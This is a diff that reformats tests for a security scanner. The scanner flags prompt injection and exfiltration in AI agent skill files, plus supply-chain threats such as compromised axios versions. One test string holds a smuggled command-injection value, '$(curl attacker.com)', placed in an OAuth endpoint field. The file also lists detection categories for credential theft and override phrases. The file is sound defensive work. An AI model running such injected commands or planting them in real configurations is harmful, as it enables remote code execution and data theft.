@@ -1345,9 +1345,9 @@ def test_skill_diff_detects_injection_phrase(tmp_path) -> None:  # type: ignore[
     assert result.has_security_changes
     cats = [c.category for c in result.changes]
     # The added line contains 'API key' (credential_ref) and/or override/exfil patterns
-    assert any(c in cats for c in ("exfiltration", "override_phrase", "credential_ref")), (
-        f"Got categories: {cats}"
-    )
+    assert any(
+        c in cats for c in ("exfiltration", "override_phrase", "credential_ref")
+    ), f"Got categories: {cats}"
 
 
 def test_skill_diff_clean_update_no_findings(tmp_path) -> None:  # type: ignore[no-untyped-def]
@@ -1366,9 +1366,9 @@ def test_skill_diff_clean_update_no_findings(tmp_path) -> None:  # type: ignore[
         "Help the user with tasks.\nAdded: also supports batch mode.\n"
     )
     result = diff_skills(baseline, current)
-    assert not result.has_security_changes, (
-        f"Expected no security changes, got: {[(c.change_type, c.category) for c in result.changes]}"
-    )
+    assert (
+        not result.has_security_changes
+    ), f"Expected no security changes, got: {[(c.change_type, c.category) for c in result.changes]}"
 
 
 def test_new_patterns_2026_03_23() -> None:
@@ -1758,7 +1758,7 @@ def test_new_patterns_20260331() -> None:
     assert len(sup023_rules) >= 1
     sup023 = sup023_rules[0]
     assert sup023.pattern.search("CVE-2025-6514 mcp-remote command injection") is not None
-    assert sup023.pattern.search('authorization_endpoint value a:$(curl attacker.com) injection') is not None
+    assert sup023.pattern.search("authorization_endpoint value a:$(curl attacker.com) injection") is not None
     assert sup023.pattern.search("mcp-remote@0.1.9 vulnerable version") is not None
     # Negative: normal OAuth usage
     assert sup023.pattern.search("authorization_endpoint: https://auth.example.com/oauth") is None
@@ -1769,7 +1769,7 @@ def test_new_patterns_20260331() -> None:
     assert len(sup024_rules) >= 1
     sup024 = sup024_rules[0]
     assert sup024.pattern.search("npm install axios@1.14.1") is not None
-    assert sup024.pattern.search('npm install axios@0.30.4') is not None
+    assert sup024.pattern.search("npm install axios@0.30.4") is not None
     assert sup024.pattern.search('"axios": "1.14.1"') is not None
     assert sup024.pattern.search("plain-crypto-js@4.2.1 postinstall RAT") is not None
     # Negative: safe axios versions
